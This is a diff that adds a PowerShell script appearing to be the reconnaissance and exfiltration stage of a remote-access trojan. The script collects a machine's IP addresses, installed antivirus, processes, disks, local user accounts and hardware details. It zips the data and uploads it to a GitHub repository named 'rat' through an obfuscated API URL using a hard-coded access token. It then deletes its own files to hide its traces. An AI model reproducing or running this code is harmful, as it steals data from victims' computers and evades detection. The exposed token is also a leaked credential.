@@ -1,0 +1,51 @@
+$ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0];
+$currentTime = Get-Date -Format "MMdd_HHmm";
+$fileName = "$ipAddress-$currentTime-XXX-kkk.txt";
+$zipName = "$ipAddress-$currentTime-XXX-kkk.zip";
+$srcPath = Join-Path $env:appdata $fileName;
+$outPath = Join-Path $env:TEMP $zipName;
+$svbs = "$env:TEMP\Cloud.vbs";
+if ([System.IO.File]::Exists($svbs)) {
+    remove-item $svbs -Force -Recurse -ErrorAction SilentlyContinue;
+}
+if ([System.IO.File]::Exists($srcPath)) {
+    remove-item $srcPath -Force -Recurse -ErrorAction SilentlyContinue;
+}
+
+if ([System.IO.File]::Exists($outPath)) {
+    remove-item $outPath -Force -Recurse -ErrorAction SilentlyContinue;
+}
+Get-NetIPAddress | Out-File -FilePath $srcPath -Append;
+(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct).displayName | Out-File -FilePath $srcPath -Append;
+Get-Process | Out-File -FilePath $srcPath -Append;
+Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Select-Object DeviceID, VolumeName, @{Name="Size(GB)"; Expression={[math]::round($_.Size / 1GB, 2)}}, @{Name="FreeSpace(GB)"; Expression={[math]::round($_.FreeSpace / 1GB, 2)}} | Out-File -FilePath $srcPath -Append;
+Get-LocalUser | Format-List * | Out-File -FilePath $srcPath -Append;
+$os = Get-CimInstance Win32_OperatingSystem;$osVersion = $os.Version;$osName = if ($osVersion -like "10.0.22*") {"Windows 11";} elseif ($osVersion -like "10.0.1*") {"Windows 10";} else {"Unknown Windows Version";}
+"Operating System (OS): $osName ($osVersion)" | Out-File -FilePath $srcPath -Append;
+$cpu = Get-CimInstance Win32_Processor;$cpuName = $cpu.Name;$cpuCores = $cpu.NumberOfCores;$cpuLogicalProcessors = $cpu.NumberOfLogicalProcessors;$cpuSpeedGHz = [math]::Round($cpu.MaxClockSpeed / 1000, 2);
+"CPU: $cpuName" | Out-File -FilePath $srcPath -Append;
+"  - Number of Cores: $cpuCores" | Out-File -FilePath $srcPath -Append;
+"  - Number of Logical Processors: $cpuLogicalProcessors" | Out-File -FilePath $srcPath -Append;
+"  - CPU Speed: $cpuSpeedGHz GHz" | Out-File -FilePath $srcPath -Append;
+$ram = Get-CimInstance Win32_ComputerSystem;$totalRAMGB = [math]::Round($ram.TotalPhysicalMemory / 1GB, 2);
+"RAM Capacity: $totalRAMGB GB" | Out-File -FilePath $srcPath -Append;
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object ProductType | Out-File -FilePath $srcPath -Append;
+Compress-Archive -Path $srcPath -CompressionLevel Optimal -DestinationPath $outPath;
+remove-item $srcPath -Force -Recurse -ErrorAction SilentlyContinue;
+$localFilePath = $outPath;
+$apiUrl = "https://a" + "pi.g" + "ith" + "ub.com/re" + "pos/tw" + "oan" + "ti" + "/r" + "at/cont" + "ents/re" + "port/" + $fileName;
+$githubToken = "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";
+$fileContent = Get-Content -Path $localFilePath -Encoding Byte;
+$fileContentBase64 = [Convert]::ToBase64String($fileContent);
+$body = @{
+    message = "Upload file $c"
+    content = $fileContentBase64
+    branch = "main"
+}
+$headers = @{
+    "Authorization" = "token $githubToken"
+    "Content-Type" = "application/json"
+}
+$response = Invoke-RestMethod -Uri $apiUrl -Method Put -Body ($body | ConvertTo-Json) -Headers $headers;
+Remove-Item -Path $outPath -Force;
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force;
